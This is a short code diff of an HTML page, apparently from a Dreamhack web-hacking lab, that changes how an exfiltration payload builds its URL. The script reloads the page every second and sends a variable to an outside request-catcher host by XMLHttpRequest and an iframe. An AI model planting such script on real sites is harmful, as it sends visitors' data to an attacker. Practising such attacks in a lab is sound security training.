@@ -13,12 +13,12 @@
         setInterval(function() {
             window.location.reload(true);
         }, 1000)
-
+        url="https://zpnzrne.request.dreamhack.games?data="+w
         var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://zpnzrne.request.dreamhack.games?data="+w, false ); // false for synchronous request
+        xmlHttp.open( "GET", url, false ); // false for synchronous request
         xmlHttp.send( null );
         return xmlHttp.responseText;
     </script>
-    <iframe src="https://zpnzrne.request.dreamhack.games?data="+w>test</iframe><br>
+    <iframe src=url>test</iframe><br>
 </body>
 </html>
